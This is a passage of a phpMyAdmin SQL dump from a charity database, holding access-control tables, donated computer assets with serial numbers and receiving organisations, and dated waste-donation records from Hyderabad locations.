-- phpMyAdmin SQL Dump
-- version 3.5.1
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Jan 15, 2013 at 12:55 PM
-- Server version: 5.5.29
-- PHP Version: 5.4.3

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `ucdblive`
--

-- --------------------------------------------------------

--
-- Table structure for table `acos`
--

CREATE TABLE IF NOT EXISTS `acos` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(10) DEFAULT NULL,
  `model` varchar(255) DEFAULT '',
  `foreign_key` int(10) unsigned DEFAULT NULL,
  `alias` varchar(255) DEFAULT '',
  `lft` int(10) DEFAULT NULL,
  `rght` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=55 ;

--
-- Dumping data for table `acos`
--

INSERT INTO `acos` (`id`, `parent_id`, `model`, `foreign_key`, `alias`, `lft`, `rght`) VALUES
(1, NULL, '', NULL, 'controllers', 1, 108),
(2, 1, NULL, NULL, 'Pages', 2, 15),
(3, 2, NULL, NULL, 'display', 3, 4),
(4, 2, NULL, NULL, 'add', 5, 6),
(5, 2, NULL, NULL, 'edit', 7, 8),
(6, 2, NULL, NULL, 'index', 9, 10),
(7, 2, NULL, NULL, 'view', 11, 12),
(8, 2, NULL, NULL, 'delete', 13, 14),
(9, 1, NULL, NULL, 'smcategories', 16, 27),
(10, 9, NULL, NULL, 'index', 17, 18),
(11, 9, NULL, NULL, 'view', 19, 20),
(12, 9, NULL, NULL, 'add', 21, 22),
(13, 9, NULL, NULL, 'edit', 23, 24),
(14, 9, NULL, NULL, 'delete', 25, 26),
(15, 1, NULL, NULL, 'smcommitments', 28, 39),
(16, 15, NULL, NULL, 'index', 29, 30),
(17, 15, NULL, NULL, 'view', 31, 32),
(18, 15, NULL, NULL, 'add', 33, 34),
(19, 15, NULL, NULL, 'edit', 35, 36),
(20, 15, NULL, NULL, 'delete', 37, 38),
(21, 1, NULL, NULL, 'smdonors', 40, 51),
(22, 21, NULL, NULL, 'index', 41, 42),
(23, 21, NULL, NULL, 'view', 43, 44),
(24, 21, NULL, NULL, 'add', 45, 46),
(25, 21, NULL, NULL, 'edit', 47, 48),
(26, 21, NULL, NULL, 'delete', 49, 50),
(27, 1, NULL, NULL, 'smgroups', 52, 65),
(28, 27, NULL, NULL, 'initdb', 53, 54),
(29, 27, NULL, NULL, 'index', 55, 56),
(30, 27, NULL, NULL, 'view', 57, 58),
(31, 27, NULL, NULL, 'add', 59, 60),
(32, 27, NULL, NULL, 'edit', 61, 62),
(33, 27, NULL, NULL, 'delete', 63, 64),
(34, 1, NULL, NULL, 'smngos', 66, 77),
(35, 34, NULL, NULL, 'index', 67, 68),
(36, 34, NULL, NULL, 'view', 69, 70),
(37, 34, NULL, NULL, 'add', 71, 72),
(38, 34, NULL, NULL, 'edit', 73, 74),
(39, 34, NULL, NULL, 'delete', 75, 76),
(40, 1, NULL, NULL, 'smrequirements', 78, 89),
(41, 40, NULL, NULL, 'index', 79, 80),
(42, 40, NULL, NULL, 'view', 81, 82),
(43, 40, NULL, NULL, 'add', 83, 84),
(44, 40, NULL, NULL, 'edit', 85, 86),
(45, 40, NULL, NULL, 'delete', 87, 88),
(46, 1, NULL, NULL, 'smusers', 90, 107),
(47, 46, NULL, NULL, 'buildAcl', 91, 92),
(48, 46, NULL, NULL, 'login', 93, 94),
(49, 46, NULL, NULL, 'logout', 95, 96),
(50, 46, NULL, NULL, 'index', 97, 98),
(51, 46, NULL, NULL, 'view', 99, 100),
(52, 46, NULL, NULL, 'add', 101, 102),
(53, 46, NULL, NULL, 'edit', 103, 104),
(54, 46, NULL, NULL, 'delete', 105, 106);

-- --------------------------------------------------------

--
-- Table structure for table `aros`
--

CREATE TABLE IF NOT EXISTS `aros` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(10) DEFAULT NULL,
  `model` varchar(255) DEFAULT '',
  `foreign_key` int(10) unsigned DEFAULT NULL,
  `alias` varchar(255) DEFAULT '',
  `lft` int(10) DEFAULT NULL,
  `rght` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `aros`
--

INSERT INTO `aros` (`id`, `parent_id`, `model`, `foreign_key`, `alias`, `lft`, `rght`) VALUES
(1, NULL, 'Smgroup', 1, '', 1, 2),
(2, NULL, 'Smgroup', 2, '', 3, 4),
(3, NULL, 'Smgroup', 3, '', 5, 6),
(4, NULL, 'Smgroup', 4, '', 7, 8);

-- --------------------------------------------------------

--
-- Table structure for table `aros_acos`
--

CREATE TABLE IF NOT EXISTS `aros_acos` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `aro_id` int(10) unsigned NOT NULL,
  `aco_id` int(10) unsigned NOT NULL,
  `_create` char(2) NOT NULL DEFAULT '0',
  `_read` char(2) NOT NULL DEFAULT '0',
  `_update` char(2) NOT NULL DEFAULT '0',
  `_delete` char(2) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `aros_acos`
--

INSERT INTO `aros_acos` (`id`, `aro_id`, `aco_id`, `_create`, `_read`, `_update`, `_delete`) VALUES
(1, 1, 1, '1', '1', '1', '1'),
(2, 2, 1, '-1', '-1', '-1', '-1'),
(3, 2, 15, '1', '1', '1', '1'),
(4, 3, 1, '-1', '-1', '-1', '-1'),
(5, 3, 40, '1', '1', '1', '1');

-- --------------------------------------------------------

--
-- Table structure for table `assets`
--

CREATE TABLE IF NOT EXISTS `assets` (
  `asset_id` int(6) NOT NULL AUTO_INCREMENT,
  `type` varchar(20) NOT NULL,
  `make` varchar(20) NOT NULL,
  `model` varchar(20) NOT NULL,
  `id_or_serial_number` varchar(50) NOT NULL,
  `donation_type` varchar(20) NOT NULL,
  `donor_city` varchar(20) NOT NULL,
  `donor_location` varchar(100) NOT NULL,
  `donor_preference` varchar(100) NOT NULL,
  `donated_by` varchar(20) NOT NULL,
  `donation_date` date NOT NULL,
  `distribution_date` date NOT NULL,
  `receiving_organisation` varchar(50) NOT NULL,
  `item_image` varchar(200) NOT NULL,
  `available` varchar(1) NOT NULL,
  PRIMARY KEY (`asset_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=33 ;

--
-- Dumping data for table `assets`
--

INSERT INTO `assets` (`asset_id`, `type`, `make`, `model`, `id_or_serial_number`, `donation_type`, `donor_city`, `donor_location`, `donor_preference`, `donated_by`, `donation_date`, `distribution_date`, `receiving_organisation`, `item_image`, `available`) VALUES
(1, 'LCD Monitor', 'HP', 'LA2205', '', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(2, 'LCD Monitor', 'HP', 'LA2205', '', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(3, 'LCD Monitor', 'HP', 'LA2205', '', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(4, 'LCD Monitor', 'HP', 'LA2205', '', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(5, 'LCD Monitor', 'HP', 'LA2205', '', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(6, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC19859415832', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(7, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC9035970328', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(8, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC28566545176', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(9, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC3509689218', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(10, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC17743099672', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Nirmaan Organization', '', ''),
(11, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC2505623320', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Ashray Akruti', '', ''),
(12, 'CPU', 'Dell', 'OPTIPLEX 780', 'SC36548217784', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Ashray Akruti', '', ''),
(13, 'CPU', 'Dell', 'OPTIPLEX 780', 'SC30017870776', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Ashray Akruti', '', ''),
(14, 'CPU', 'Dell', 'OPTIPLEX 780', 'SC34371435448', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Ashray Akruti', '', ''),
(15, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC-NA', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-30', 'Ashray Akruti', '', ''),
(16, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC24212980504', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-07-27', 'Teach For India', '', ''),
(17, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC8975504152', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-08-29', 'Nirmaan Organization', '', ''),
(18, 'CPU', 'Dell', 'OPTIPLEX 380', 'SC13389535000', 'Kind Donation', '', '', '', 'Invesco', '2012-06-29', '2012-08-29', 'Nirmaan Organization', '', ''),
(19, 'Laptop', 'Compaq', 'Armada M300', 'AM3P3600T2X12C64N2', 'Kind Donation', '', '', '', 'Ms. Hema', '2012-08-09', '0000-00-00', 'UC Volunteer Activities', '', ''),
(20, 'Laptop', 'Compaq', 'Armada M300', 'AM3P3500T1X12C6458', 'Kind Donation', '', '', '', 'Ms. Hema', '2012-08-09', '0000-00-00', 'UC Volunteer Activities', '', ''),
(21, 'Laptop', 'Acer', 'Aspire V5-431', 'NXM2SS1001220118CA2000', 'Purchased', '', '', '', 'UCDS', '2012-07-22', '0000-00-00', 'UCDS', '', ''),
(22, 'Laptop', 'Acer', 'Aspire E1-431', 'NXM0RS10082170D3187600', 'Purchased', '', '', '', 'UCDS', '2012-08-03', '0000-00-00', 'UCDS', '', ''),
(23, 'Laptop', 'Acer', 'Aspire E1-431', 'NXM0RS10082170D4447600', 'Purchased', '', '', '', 'UCDS', '2012-08-03', '2012-08-30', 'Ekam Foundation', '', ''),
(24, 'Laptop', 'Acer', 'Aspire-5542', 'LXPHB010010062BB9F2000', 'Purchased', '', '', '', 'UCDS', '0000-00-00', '0000-00-00', 'Indian Grameen Services', '', ''),
(25, 'Laptop', 'Acer', 'Aspire-5542', 'LXPHB0100194235F7C2000', 'Purchased', '', '', '', 'UCDS', '2010-01-09', '0000-00-00', 'Indian Grameen Services', '', ''),
(26, 'Laptop', 'Sony', 'Sony Vaio', '', 'Kind Donation', '', '', '', 'Dr. Aruna', '0000-00-00', '0000-00-00', 'Indian Grameen Services', '', ''),
(27, 'Tab', 'Samsung', '', '', 'Purchased', '', '', '', 'UCDS', '2011-07-18', '0000-00-00', 'Indian Grameen Services', '', ''),
(28, 'Laptop', 'Dell', 'Latitude D610', 'CN-0XD762-48643-63E-2553', 'Kind Donation', '', '', '', 'GE', '2011-09-01', '0000-00-00', 'UC Volunteer Activities', '', ''),
(29, 'Laptop', 'Dell', 'Latitude D610', 'CN-0XD762-48643-65S-2338', 'Kind Donation', '', '', '', 'GE', '2011-09-01', '2012-08-30', 'Ekam Foundation', '', ''),
(30, 'Laptop', 'Dell', 'Latitude D610', 'CN-0XD762-48643-65S-2307', 'Kind Donation', '', '', '', 'GE', '2011-09-01', '0000-00-00', 'UC Volunteer Activities', '', ''),
(31, 'Laptop', 'Dell', 'Latitude D610', '', 'Kind Donation', '', '', '', 'GE', '2011-09-01', '0000-00-00', 'UC Volunteer Activities', '', ''),
(32, 'Laptop', 'Dell', 'Latitude D610', 'CN-0XD762-48643-65G-3128', 'Kind Donation', '', '', '', 'GE', '2011-09-01', '0000-00-00', 'Nirmaan Organization', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `donatewaste`
--

CREATE TABLE IF NOT EXISTS `donatewaste` (
  `donationid` int(25) NOT NULL AUTO_INCREMENT,
  `dateofdonation` date NOT NULL,
  `DONOR_ID` int(7) NOT NULL,
  `placeofdonation` varchar(25) NOT NULL,
  `city` varchar(25) NOT NULL,
  `item_id` int(25) NOT NULL,
  `donationunit` int(1) NOT NULL COMMENT 'kgs-1,count-2',
  `donationquantity` decimal(10,1) NOT NULL,
  `donationunitvalue` int(25) NOT NULL,
  `donationcalculatedvalue` int(25) NOT NULL,
  `donationvalue` int(25) NOT NULL,
  `note` varchar(100) NOT NULL,
  `author` varchar(100) NOT NULL,
  `publisher` varchar(100) NOT NULL,
  `category` varchar(100) NOT NULL,
  `subject` varchar(100) NOT NULL,
  PRIMARY KEY (`donationid`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1186 ;

--
-- Dumping data for table `donatewaste`
--

INSERT INTO `donatewaste` (`donationid`, `dateofdonation`, `DONOR_ID`, `placeofdonation`, `city`, `item_id`, `donationunit`, `donationquantity`, `donationunitvalue`, `donationcalculatedvalue`, `donationvalue`, `note`, `author`, `publisher`, `category`, `subject`) VALUES
(452, '2011-07-27', 67, 'Invesco', 'Hyderabad', 64, 1, '79.0', 7, 553, 553, '', '', '', '', ''),
(453, '2011-07-27', 67, 'Invesco', 'Hyderabad', 37, 1, '57.0', 6, 342, 342, '', '', '', '', ''),
(454, '2011-07-27', 67, 'Invesco', 'Hyderabad', 46, 1, '16.0', 9, 144, 144, '', '', '', '', ''),
(455, '2011-07-27', 67, 'Invesco', 'Hyderabad', 43, 1, '97.0', 7, 679, 679, 'Invesco-Employees', '', '', '', ''),
(456, '2011-07-27', 67, 'Invesco', 'Hyderabad', 40, 1, '15.0', 18, 270, 270, 'Invesco-Employees', '', '', '', ''),
(457, '2011-07-27', 67, 'Invesco', 'Hyderabad', 50, 1, '3.0', 5, 15, 15, 'Invesco-Employees', '', '', '', ''),
(464, '2011-07-07', 67, 'Invesco', 'Hyderabad', 43, 1, '23.0', 7, 154, 157, '', '', '', '', ''),
(465, '2011-07-07', 67, 'Invesco', 'Hyderabad', 64, 1, '53.0', 7, 371, 371, '', '', '', '', ''),
(466, '2011-07-07', 67, 'Invesco', 'Hyderabad', 37, 1, '57.0', 6, 342, 342, '', '', '', '', ''),
(467, '2011-07-30', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '30.0', 5, 150, 150, '', '', '', '', ''),
(468, '2011-07-30', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '18.0', 7, 126, 126, '', '', '', '', ''),
(469, '2011-07-30', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '5.0', 5, 20, 24, '', '', '', '', ''),
(470, '2011-07-30', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '8.0', 5, 40, 40, '', '', '', '', ''),
(471, '2011-07-30', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '1.0', 10, 10, 10, '', '', '', '', ''),
(472, '2011-07-30', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '6.0', 15, 90, 90, '', '', '', '', ''),
(473, '2011-08-05', 64, 'Panjagutta-ABS', 'Hyderabad', 43, 1, '37.0', 6, 222, 222, '', '', '', '', ''),
(474, '2011-08-05', 64, 'Panjagutta-ABS', 'Hyderabad', 47, 1, '5.0', 5, 25, 28, '', '', '', '', ''),
(475, '2011-08-06', 68, 'Synopsys', 'Hyderabad', 43, 1, '34.0', 7, 238, 238, '', '', '', '', ''),
(476, '2011-08-06', 68, 'Synopsys', 'Hyderabad', 45, 1, '12.0', 8, 96, 96, '', '', '', '', ''),
(477, '2011-08-06', 68, 'Synopsys', 'Hyderabad', 40, 1, '51.0', 18, 918, 918, '', '', '', '', ''),
(478, '2011-08-06', 68, 'Synopsys', 'Hyderabad', 37, 1, '17.0', 6, 102, 102, '', '', '', '', ''),
(514, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 43, 1, '241.0', 7, 1687, 1687, '', '', '', '', ''),
(486, '2011-08-07', 73, 'Gachibowli', 'Hyderabad', 43, 1, '310.0', 7, 1547, 1992, '', '', '', '', ''),
(485, '2011-08-07', 73, 'Gachibowli', 'Hyderabad', 37, 1, '9.0', 6, 54, 54, '', '', '', '', ''),
(484, '2011-08-07', 73, 'Gachibowli', 'Hyderabad', 45, 1, '89.0', 5, 445, 445, '', '', '', '', ''),
(488, '2011-08-07', 73, 'Gachibowli', 'Hyderabad', 39, 2, '30.0', 2, 60, 60, 'Big beer bottles', '', '', '', ''),
(489, '2011-08-07', 73, 'Gachibowli', 'Hyderabad', 39, 2, '48.0', 1, 48, 48, 'Small Beer bottles', '', '', '', ''),
(490, '2011-08-07', 73, 'Gachibowli', 'Hyderabad', 40, 1, '21.0', 18, 378, 428, '', '', '', '', ''),
(491, '2011-08-07', 73, 'Gachibowli', 'Hyderabad', 54, 1, '14.0', 1, 14, 14, '', '', '', '', ''),
(492, '2011-08-07', 72, 'Gachibowli', 'Hyderabad', 42, 1, '15.0', 5, 75, 77, '', '', '', '', ''),
(513, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 36, 1, '44.0', 6, 264, 264, '', '', '', '', ''),
(494, '2011-07-03', 73, 'Gachibowli', 'Hyderabad', 42, 1, '57.0', 7, 399, 399, '', '', '', '', ''),
(495, '2011-07-03', 73, 'Gachibowli', 'Hyderabad', 37, 1, '8.0', 7, 56, 56, '', '', '', '', ''),
(496, '2011-07-03', 73, 'Gachibowli', 'Hyderabad', 45, 1, '5.0', 10, 40, 45, '', '', '', '', ''),
(497, '2011-07-03', 73, 'Gachibowli', 'Hyderabad', 47, 1, '9.0', 5, 45, 45, '', '', '', '', ''),
(498, '2011-07-03', 73, 'Gachibowli', 'Hyderabad', 39, 2, '20.0', 0, 0, 24, '', '', '', '', ''),
(499, '2011-07-03', 72, 'Gachibowli', 'Hyderabad', 43, 1, '55.0', 7, 378, 382, '', '', '', '', ''),
(500, '2011-07-03', 72, 'Gachibowli', 'Hyderabad', 47, 1, '7.0', 5, 30, 32, '', '', '', '', ''),
(501, '2011-07-03', 72, 'Gachibowli', 'Hyderabad', 36, 1, '11.0', 7, 77, 77, '', '', '', '', ''),
(502, '2011-07-07', 68, 'Gachibowli', 'Hyderabad', 43, 1, '38.0', 8, 304, 304, '', '', '', '', ''),
(503, '2011-07-07', 68, 'Gachibowli', 'Hyderabad', 37, 1, '220.0', 6, 1320, 1320, '', '', '', '', ''),
(504, '2011-08-27', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '12.0', 7, 77, 80, '', '', '', '', ''),
(505, '2011-08-27', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '19.0', 5, 90, 91, '', '', '', '', ''),
(506, '2011-08-27', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '11.0', 5, 50, 53, '', '', '', '', ''),
(507, '2011-08-27', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '3.0', 8, 16, 20, '', '', '', '', ''),
(508, '2011-08-27', 63, 'PadmaraoNagar', 'Hyderabad', 49, 1, '1.0', 4, 4, 4, '', '', '', '', ''),
(509, '2011-08-27', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '1.0', 15, 15, 15, '', '', '', '', ''),
(510, '2011-08-27', 67, 'Gachibowli', 'Hyderabad', 64, 1, '46.0', 7, 322, 322, '', '', '', '', ''),
(511, '2011-08-27', 67, 'Gachibowli', 'Hyderabad', 37, 1, '45.0', 6, 270, 270, '', '', '', '', ''),
(512, '2011-08-27', 67, 'Gachibowli', 'Hyderabad', 43, 1, '45.0', 6, 270, 270, '', '', '', '', ''),
(515, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 45, 1, '40.0', 4, 160, 160, '', '', '', '', ''),
(516, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 40, 1, '37.0', 18, 666, 666, '', '', '', '', ''),
(517, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 39, 2, '27.0', 0, 0, 38, '', '', '', '', ''),
(518, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 42, 1, '11.0', 4, 40, 42, '', '', '', '', ''),
(519, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 48, 1, '13.0', 8, 104, 104, '', '', '', '', ''),
(520, '2011-09-04', 73, 'Gachibowli', 'Hyderabad', 37, 1, '23.0', 4, 88, 90, '', '', '', '', ''),
(521, '2011-09-04', 72, 'Gachibowli', 'hyderabad', 40, 1, '5.0', 18, 90, 90, '', '', '', '', ''),
(522, '2011-09-04', 72, 'Gachibowli', 'hyderabad', 47, 1, '3.0', 8, 24, 24, '', '', '', '', ''),
(523, '2011-09-24', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '14.0', 7, 98, 98, '', '', '', '', ''),
(524, '2011-09-24', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '2.0', 17, 34, 37, '', '', '', '', ''),
(525, '2011-09-24', 63, 'PadmaraoNagar', 'Hyderabad', 54, 2, '10.0', 0, 0, 15, '', '', '', '', ''),
(526, '2011-09-24', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '10.0', 5, 50, 50, '', '', '', '', ''),
(527, '2011-09-24', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '3.0', 10, 30, 30, '', '', '', '', ''),
(528, '2011-09-24', 63, 'PadmaraoNagar', 'Hyderabad', 48, 1, '8.0', 5, 40, 40, '', '', '', '', ''),
(529, '2011-09-24', 63, 'PadmaraoNagar', 'Hyderabad', 41, 1, '5.0', 6, 30, 30, '', '', '', '', ''),
(530, '2011-09-30', 67, 'Gachibowli', 'Hyderabad', 64, 1, '235.0', 8, 1880, 1880, '', '', '', '', ''),
(531, '2011-09-30', 67, 'Gachibowli', 'Hyderabad', 37, 1, '187.0', 6, 1122, 1122, '', '', '', '', ''),
(532, '2011-09-30', 67, 'Gachibowli', 'Hyderabad', 43, 1, '30.0', 8, 240, 240, '', '', '', '', ''),
(533, '2011-09-22', 71, 'Banjara Hills', 'Hyderabad', 42, 1, '35.0', 6, 210, 211, '', '', '', '', ''),
(534, '2011-09-22', 71, 'Banjara Hills', 'Hyderabad', 41, 2, '20.0', 0, 0, 600, 'Employee Donations', '', '', '', ''),
(535, '2011-10-07', 138, 'Ameerpet', 'Hyderabad', 38, 2, '10.0', 0, 0, 2600, '', '', '', '', ''),
(536, '2011-10-02', 73, 'Gachibowli', 'Hyderabad', 43, 1, '41.0', 7, 287, 290, '', '', '', '', ''),
(537, '2011-10-02', 73, 'Gachibowli', 'Hyderabad', 42, 1, '23.0', 6, 138, 138, '', '', '', '', ''),
(538, '2011-10-02', 73, 'Gachibowli', 'Hyderabad', 45, 1, '6.0', 8, 40, 44, '', '', '', '', ''),
(539, '2011-10-02', 73, 'Gachibowli', 'Hyderabad', 47, 1, '2.0', 5, 5, 8, '', '', '', '', ''),
(540, '2011-10-02', 73, 'Gachibowli', 'Hyderabad', 40, 1, '1.0', 16, 16, 16, '', '', '', '', ''),
(541, '2011-10-02', 73, 'Gachibowli', 'Hyderabad', 39, 2, '20.0', 0, 0, 54, '', '', '', '', ''),
(542, '2011-10-02', 73, 'Gachibowli', 'Hyderabad', 41, 2, '14.0', 0, 0, 455, 'Donated by students', '', '', '', ''),
(543, '2011-06-25', 71, 'Banjara Hills', 'Hyderabad', 42, 1, '55.0', 6, 275, 302, '', '', '', '', ''),
(544, '2011-06-25', 71, 'Banjara Hills', 'Hyderabad', 37, 1, '3.0', 7, 21, 21, '', '', '', '', ''),
(545, '2011-06-10', 67, 'Gachibowli', 'Hyderabad', 43, 1, '93.0', 7, 644, 647, '', '', '', '', ''),
(546, '2011-06-10', 67, 'Gachibowli', 'Hyderabad', 37, 1, '259.0', 7, 1806, 1810, '', '', '', '', ''),
(547, '2011-06-10', 67, 'Gachibowli', 'Hyderabad', 64, 1, '77.0', 6, 456, 459, '', '', '', '', ''),
(548, '2011-06-25', 67, 'Gachibowli', 'Hyderabad', 64, 1, '88.0', 7, 616, 616, '', '', '', '', ''),
(549, '2011-06-25', 67, 'Gachibowli', 'Hyderabad', 37, 1, '68.0', 7, 476, 476, '', '', '', '', ''),
(550, '2011-06-25', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '20.0', 5, 100, 100, '', '', '', '', ''),
(551, '2011-06-25', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '11.0', 7, 77, 80, '', '', '', '', ''),
(552, '2011-06-25', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '13.0', 5, 60, 66, '', '', '', '', ''),
(553, '2011-06-25', 63, 'PadmaraoNagar', 'Hyderabad', 54, 2, '3.0', 0, 0, 4, '', '', '', '', ''),
(554, '2011-06-25', 63, 'PadmaraoNagar', 'Hyderabad', 41, 2, '1.0', 0, 0, 50, '', '', '', '', ''),
(555, '2011-06-08', 63, 'PadmaraoNagar', 'Hyderabad', 41, 2, '17.0', 0, 0, 600, 'Pairs of shoes and other scrap', '', '', '', ''),
(556, '2011-06-14', 63, 'PadmaraoNagar', 'Hyderabad', 40, 2, '1.0', 0, 0, 220, '', '', '', '', ''),
(557, '2011-06-05', 72, 'Gachibowli', 'Hyderabad', 43, 1, '44.0', 9, 387, 387, 'Included magazines', '', '', '', ''),
(558, '2011-06-05', 72, 'Gachibowli', 'Hyderabad', 37, 1, '3.0', 8, 24, 24, '', '', '', '', ''),
(559, '2011-06-05', 72, 'Gachibowli', 'Hyderabad', 47, 1, '13.0', 12, 156, 156, '', '', '', '', ''),
(560, '2011-06-05', 72, 'Gachibowli', 'Hyderabad', 40, 1, '1.0', 22, 0, 13, '', '', '', '', ''),
(561, '2011-06-05', 72, 'Gachibowli', 'Hyderabad', 54, 1, '1.0', 20, 0, 10, '', '', '', '', ''),
(562, '2011-06-05', 72, 'Gachibowli', 'Hyderabad', 45, 1, '7.0', 5, 30, 30, '', '', '', '', ''),
(563, '2011-06-05', 72, 'Gachibowli', 'Hyderabad', 47, 1, '10.0', 10, 100, 100, '', '', '', '', ''),
(564, '2011-06-13', 68, 'Gachibowli', 'Hyderabad', 43, 1, '74.0', 8, 592, 592, '', '', '', '', ''),
(565, '2011-06-13', 68, 'Gachibowli', 'Hyderabad', 37, 1, '266.0', 7, 1862, 1862, '', '', '', '', ''),
(566, '2011-06-13', 68, 'Gachibowli', 'Hyderabad', 54, 1, '6.0', 1, 6, 6, '', '', '', '', ''),
(567, '2011-05-28', 71, 'Banjara Hills', 'Hyderabad', 42, 1, '47.0', 5, 235, 255, '', '', '', '', ''),
(568, '2011-05-28', 71, 'Banjara Hills', 'Hyderabad', 37, 1, '9.0', 5, 45, 45, '', '', '', '', ''),
(569, '2011-05-05', 71, 'Banjara Hills', 'Hyderabad', 42, 1, '88.0', 5, 440, 440, '', '', '', '', ''),
(570, '2011-05-05', 71, 'Banjara Hills', 'Hyderabad', 37, 1, '32.0', 5, 160, 160, '', '', '', '', ''),
(571, '2011-05-04', 71, 'Koti', 'Hyderabad', 42, 1, '31.0', 6, 155, 170, '', '', '', '', ''),
(572, '2011-05-28', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '15.0', 6, 84, 87, '', '', '', '', ''),
(573, '2011-05-28', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '14.0', 7, 98, 98, '', '', '', '', ''),
(574, '2011-05-28', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '3.0', 6, 12, 15, '', '', '', '', ''),
(575, '2011-05-28', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '4.0', 3, 9, 10, '', '', '', '', ''),
(576, '2011-05-28', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '4.0', 5, 20, 20, '', '', '', '', ''),
(577, '2011-05-28', 63, 'PadmaraoNagar', 'Hyderabad', 47, 1, '6.0', 12, 60, 66, '', '', '', '', ''),
(578, '2011-05-28', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '37.0', 6, 216, 224, '', '', '', '', ''),
(579, '2011-05-31', 63, 'PadmaraoNagar', 'Hyderabad', 41, 2, '2.0', 0, 0, 100, '2 Poly bags of shoes', '', '', '', ''),
(580, '2011-05-29', 64, 'Panjagutta-ABS', 'Hyderabad', 42, 1, '9.0', 5, 45, 45, '', '', '', '', ''),
(581, '2011-05-29', 64, 'Panjagutta-ABS', 'Hyderabad', 43, 1, '31.0', 7, 217, 217, '', '', '', '', ''),
(582, '2011-05-29', 64, 'Panjagutta-ABS', 'Hyderabad', 45, 1, '2.0', 10, 10, 15, '', '', '', '', ''),
(583, '2011-05-29', 64, 'Panjagutta-ABS', 'Hyderabad', 40, 1, '2.0', 10, 10, 15, '', '', '', '', ''),
